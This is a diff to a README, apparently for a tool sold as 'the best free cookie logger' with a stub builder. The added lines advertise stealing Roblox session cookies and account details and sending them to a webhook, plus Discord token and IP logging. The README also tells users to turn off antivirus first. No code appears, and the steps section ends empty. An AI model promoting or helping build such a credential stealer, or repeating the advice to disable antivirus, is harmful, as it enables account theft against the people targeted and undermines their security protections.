@@ -1,10 +1,23 @@
 # This Is The Best Free Cookie Logger That Uses A Stub Builder
-
+ O
+/|\
+ /\
 # Before The Steps Turn Off Antivirus Or The File Will Come Out With An ERROR Or Failed To Download Potential Virus Something Like That
+
+# Features
+1; Roblox Cookie Logger
+2; Roblox Info Such As Roblox Friends, Followers, Username And Gamepasses All Sent To Webhook 
+
+# Extra Features
+1; Discord Token Logger
+2; Ip Logger
 
 # Sorry About the Gui It looks Ugly
 
 <img width="288" alt="Screenshot 2022-07-03 133852" src="https://user-images.githubusercontent.com/108227869/177040180-d6c2a00d-24a1-4ee4-8498-406ca9bbe473.png">
+
+
+
 
 # STEPS BELOW
 
